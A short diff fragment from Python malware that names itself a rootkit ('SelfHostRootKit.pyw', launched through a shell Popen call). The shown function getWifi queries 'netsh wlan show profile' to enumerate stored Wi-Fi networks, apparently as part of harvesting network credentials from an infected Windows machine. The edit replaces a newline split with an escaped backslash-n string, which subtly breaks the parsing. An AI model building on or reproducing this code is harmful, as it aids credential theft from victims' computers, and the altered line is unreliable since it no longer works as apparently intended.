@@ -71,7 +71,7 @@ Popen("start SelfHostRootKit.pyw", shell=True)
 def getWifi():
     import subprocess
     ret = ''
-    for i in subprocess.Popen('netsh wlan show profile',stdout=subprocess.PIPE).stdout.read().decode('ascii', "ignore").split('\n'):
+    for i in subprocess.Popen('netsh wlan show profile',stdout=subprocess.PIPE).stdout.read().decode('ascii', "ignore").split('\\n'):
         try:
             i.split(': ')[1]
             try:
